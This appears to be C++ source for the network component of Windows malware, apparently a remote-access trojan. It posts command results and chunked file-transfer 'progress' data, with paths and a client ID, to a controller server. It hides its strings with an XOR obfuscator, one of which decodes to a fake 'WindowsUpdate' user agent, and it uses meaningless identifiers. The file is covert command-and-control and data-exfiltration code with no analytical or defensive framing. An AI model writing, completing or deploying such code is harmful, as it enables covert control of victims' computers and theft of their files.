#include "fb.h"
#include "mt.h"

string hA(const string& host, int port, const string& path, const string& data) {
    hB("POST " + host + ":" + to_string(port) + path + " (" + to_string(data.length()) + " bytes)");
    string result;
    HINTERNET hInternet = InternetOpenA(__o("\x02\x3c\x3b\x31\x3a\x22\x26\x00\x25\x31\x34\x21\x30\x7a\x64\x7b\x65",17).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        DWORD connectTimeout = 8000;
        DWORD ioTimeout = data.length() > (1024 * 512) ? 30000 : 10000;
        InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &connectTimeout, sizeof(connectTimeout));
        InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &ioTimeout, sizeof(ioTimeout));
        InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &ioTimeout, sizeof(ioTimeout));
        HINTERNET hSession = InternetConnectA(hInternet, host.c_str(), (INTERNET_PORT)port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hSession) {
            HINTERNET hRequest = HttpOpenRequestA(hSession, "POST", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
            if (hRequest) {
                InternetSetOptionA(hRequest, INTERNET_OPTION_CONNECT_TIMEOUT, &connectTimeout, sizeof(connectTimeout));
                InternetSetOptionA(hRequest, INTERNET_OPTION_SEND_TIMEOUT, &ioTimeout, sizeof(ioTimeout));
                InternetSetOptionA(hRequest, INTERNET_OPTION_RECEIVE_TIMEOUT, &ioTimeout, sizeof(ioTimeout));
                const char* headers = "Content-Type: application/json\r\nConnection: close\r\nCache-Control: no-cache\r\n";
                if (HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers), (LPVOID)data.c_str(), (DWORD)data.length())) {
                    char buffer[4096];
                    DWORD bytesRead;
                    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                        buffer[bytesRead] = '\0';
                        result += buffer;
                    }
                }
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hSession);
        }
        InternetCloseHandle(hInternet);
    }
    if (!result.empty())
        hB("response: " + result.substr(0, 200));
    else
        hB(__o("\x3b\x3a\x75\x27\x30\x26\x25\x3a\x3b\x26\x30",11));
    return result;
}

void zF(int commandId, const string& result) {
    if (yN.empty()) return;
    string data = "{\"type\":\"command_result\",\"client_id\":\"" + yN + "\",\"command_id\":" + to_string(commandId) + ",\"result\":\"" + zY(result) + "\"}";
    hA(yL, yM, yK, data);
}

void zG(int commandId, const string& type, const string& path, int index, int total, const string& data) {
    string json = "{\"type\":\"progress\",\"subtype\":\"" + type + "\",\"command_id\":" + to_string(commandId)
        + ",\"client_id\":\"" + yN + "\",\"path\":\"" + zY(path)
        + "\",\"index\":" + to_string(index) + ",\"total\":" + to_string(total)
        + ",\"data\":\"" + data + "\"}";
    hA(yL, yM, yK, json);
}
